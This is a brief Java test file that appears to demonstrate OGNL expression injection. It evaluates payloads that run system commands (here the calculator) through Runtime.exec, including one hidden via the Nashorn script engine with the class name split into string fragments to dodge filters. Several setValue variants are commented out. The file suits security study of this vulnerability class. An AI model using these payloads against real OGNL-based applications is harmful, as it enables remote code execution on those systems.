import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

import javax.script.ScriptEngineManager;

public class OGNLTest {

    public static void main(String[] args) throws OgnlException {
        // 创建一个OGNL上下文对象
        OgnlContext context = new OgnlContext();

        String payload = "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")";


        Ognl.getValue(payload,context,context.getRoot());
        // getValue()触发
        Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());

        // setValue()触发
        //Ognl.setValue("(\"@java.lang.Runtime@getRuntime().exec('calc')\")(2)(3)",context,context.getRoot());
        //Ognl.setValue("@java.lang.Runtime@getRuntime().exec('calc').toString()", context, context.getRoot());
        //Ognl.setValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());

    }

}
